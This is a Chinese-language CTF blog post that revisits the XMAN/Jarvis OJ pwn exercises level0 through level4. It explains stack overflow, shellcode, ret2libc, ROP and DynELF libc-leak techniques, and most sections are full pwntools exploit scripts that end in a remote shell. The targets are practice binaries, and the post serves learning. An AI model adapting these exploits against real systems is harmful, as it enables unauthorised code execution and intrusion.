
title:  xman pwn题复现——学pwn小记（4）
categories: [CTF]
tags: [pwn]

---
最近在查阅资料时,无意中发现之前xman的环境还在,现在粗略的学习pwn.想起当时题都是比较基层的栈,加上上海省赛把pwn环境搞崩了,趁这个机会在怀旧的同时把一些知识点给复习升华下.<!-- more -->


## level0

最简单的,栈溢出.

![image-20210113124043442](image-20210113124043442.png)

只开了NX保护.看反汇编代码发现,有栈溢出点.同时内部有后门.

![image-20210113123620972](image-20210113123620972.png)

exp:

```python
from pwn import *
e=ELF('level0')
p=remote('pwn2.jarvisoj.com',9881)
pay='a'*0x80+p64(0)+p64(e.symbols['callsystem'])
p.sendline(pay)
p.interactive()
```

## Tell Me Something

![image-20210113131440686](image-20210113131440686.png)

还是只开了nx保护.

![image-20210113132618818](image-20210113132618818.png)

发现有栈溢出利用点与后门.

但是要注意的是这道题的mian函数.

![image-20210113132742912](image-20210113132742912.png)

我们正常的mian函数一般是如下:

![image-20210113132512530](image-20210113132512530.png)

即是有:

```bash
push rbp     #把上一个栈的rbp入栈
mov rbp,rsp
...
...
..
leave    # leave 相当于mov esp,ebp;pop ebp;
retn
```

我们在平常里构造栈出时：

```
buf+(0xbeadcade)+恶意code 
```

0xbeadcade的数据就为了平衡leave中的pop，因此在本题目中mian函数没有pop ebp或leave。因此payload不需要加(0xbeadcade)。

exp：

![image-20210113135133488](image-20210113135133488.png)

## level1

一个32位的程序，什么保护也没有开。

![image-20210113135547290](image-20210113135547290.png)

反汇编看，发现buf有可控栈溢出，同时提示了buf地址猜测可以手动入shell。

![image-20210113135742482](image-20210113135742482.png)

exp：

```python
from pwn import *

e=ELF('level1')
p=remote('pwn2.jarvisoj.com', 9877)
#p=process('level1')


p.recvuntil("What's this:")
addr=p.recvuntil("?")[:-1]
print(addr)
addr=int(addr,16)

pay1=asm(shellcraft.sh())
pay1=pay1.ljust(0x88,'a')
pay1=pay1+p32(0)+p32(addr)


p.sendline(pay1)
p.interactive()
```

![image-20210113140015120](image-20210113140015120.png)

## level2

![image-20210113140431065](image-20210113140431065.png)

一个32位的程序，只NX保护。看反汇编代码发现栈溢出利用点。

![image-20210113140350462](image-20210113140350462.png)

同时环境中有system函数，我们可以利用ret2libc的方法。

```python
from pwn import *
e=ELF('level2')
p=remote('pwn2.jarvisoj.com',9878)#process('level2')

pay='a'*0x88+p32(0)+p32(e.plt['system'])+p32(0x0804A024)+p32(0x0804A024)#0x0804A024为/bin/sh地址

p.sendline(pay)

p.interactive()
```

## level2_x64

环境与32位的环境差不多，但是x64的传参与x32下不同。

x64中前6个参数是按顺序从 rdi ，rsi ，rdx，rcx，r8，r9这6寄存器传递参数的。x32是纯通过栈来传递参数的。因此我们可以用：

`ROPgadget --binary level2_x64 --only 'pop|ret'`来寻找我们可以利用的gadget。



![image-20210113141628743](image-20210113141628743.png)

exp：

```python
from pwn import *
e=ELF('level2_x64')
p=remote('pwn2.jarvisoj.com',9882)#process('level2_x64')
pay='a'*0x80+p64(0)+p64(0x00000004006b3)+p64(0x00000600A90)+p64(e.plt['system'])
p.sendline(pay)
p.interactive()
```

## level3_x64

为一个64位的程序只开了nx保护。

![image-20210113142124824](image-20210113142124824.png)

发现栈溢出点但是环境中没有sytstem与`/bin/sh`

因此我们要泄露出libc版本。ps：在做时，发现LibcSearcher泄露出来不准，因此用leak方法来做的。

```python
from pwn import *
from LibcSearcher import LibcSearcher
e=ELF('level3_x64')
p=remote('pwn2.jarvisoj.com',9884)
#context.update(bits=64)

def leak(address):
	pay='a'*0x80+p64(0)+p64(0x00004006AA)+p64(0)+p64(1)+p64(e.got['write'])+p64(8)+p64(address)+p64(1)+p64(0x0000000400690)+'\00'*56+p64(e.symbols['_start'])
#gdb.attach(p)
	p.sendline(pay)
        p.recvline()
	add=p.recv(8)
        return add

d=DynELF(leak,elf=e)
system_addr=d.lookup('system','libc')

pay='a'*0x80+p64(0)+p64(0x00004006AA)+p64(0)+p64(1)+p64(e.got['read'])+p64(8)+p64(0x00000000600A88)+p64(0)+p64(0x0000000400690)+'\00'*56+p64(e.symbols['_start'])
p.sendline(pay)
p.send('/bin/sh\x00')
pay='a'*0x80+p64(0)+p64(0x000004006b3)+p64(0x00000000600A88)+p64(system_addr)+p64(e.symbols['_start'])
p.sendline(pay)
p.interactive()
```

## level4

方法与level3差不多，leak出libc版本，然后ret2libc。

exp:

```python
from pwn import *
from LibcSearcher import LibcSearcher
e=ELF('level4')
#p=process('level4')
p=remote('pwn2.jarvisoj.com',9880)

def leak(address):
	pay='a'*0x88+p32(0)+p32(e.plt['write'])+p32(e.symbols['_start'])+p32(1)+p32(address)+p32(4)
#gdb.attach(p)
	p.sendline(pay)
	add=p.recv(4)
        return add

d=DynELF(leak,elf=e)
system_addr=d.lookup('system','libc')
print hex(system_addr)
read_plt=e.symbols['read']

#gdb.attach(p)
pay='a'*0x88+p32(0)+p32(read_plt)+p32(e.symbols['_start'])+p32(0)+p32(0x0804A024)+p32(8)
p.send(pay)
sleep(1)
p.send('/bin/sh\x00')
print "get shell"
pay='a'*0x88+p32(0)+p32(system_addr)+p32(e.symbols['_start'])+p32(0x0804A024)
p.sendline(pay)

p.interactive()
```

